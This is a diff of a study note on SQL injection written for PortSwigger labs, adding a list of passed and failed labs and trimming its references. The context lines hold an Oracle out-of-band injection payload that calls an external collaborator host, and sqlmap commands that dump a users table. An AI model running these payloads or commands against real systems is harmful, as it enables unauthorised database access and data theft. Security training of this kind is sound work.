@@ -75,7 +75,7 @@ server asynchronous (out of band):
   'UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//collaborator/">+%25remote%3b]>'),'/l')+FROM+dual--;
   ```
 
-## Preparation for exam (bug bounty too)
+## Preparation for exam
 
 [cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 
@@ -110,10 +110,14 @@ phase:
 - sqlmap -r ~/Desktop/test-sqlmap -batch -D public --tables
 - sqlmap -r ~/Desktop/test-sqlmap -batch -D public -T users -dump
 
+successed: lab [5](./lab/5.%20SQL%20injection%20UNION%20attack%2C%20retrieving%20data%20from%20other%20tables.md), [6](./lab/6.%20SQL%20injection%20UNION%20attack%2C%20retrieving%20multiple%20values%20in%20a%20single%20column.md), [9](./lab/9.%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20non-Oracle%20databases.md), [10](./lab/10.%20SQL%20injection%20attack%2C%20listing%20the%20database%20contents%20on%20Oracle.md), [11](./lab/11.%20Blind%20SQL%20injection%20with%20conditional%20responses.md), [14](./lab/14.%20Blind%20SQL%20injection%20with%20time%20delays%20and%20information%20retrieval.md)
+
+- synchronous, time-delays
+
+failed: lab [12](./lab/12.%20Blind%20SQL%20injection%20with%20conditional%20errors.md), [15](./lab/15.%20Blind%20SQL%20injection%20with%20out-of-band%20interaction.md), [16](./lab/16.%20Blind%20SQL%20injection%20with%20out-of-band%20data%20exfiltration.md), [17](./lab/16.%20Blind%20SQL%20injection%20with%20out-of-band%20data%20exfiltration.md)
+
+- asynchronous, oob (maybe portswigger labs only), tamper
+
 ## References
 
-[Union attack](https://portswigger.net/web-security/sql-injection/union-attacks)
-
 [cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
-
-[examining the db](https://portswigger.net/web-security/sql-injection/examining-the-database)
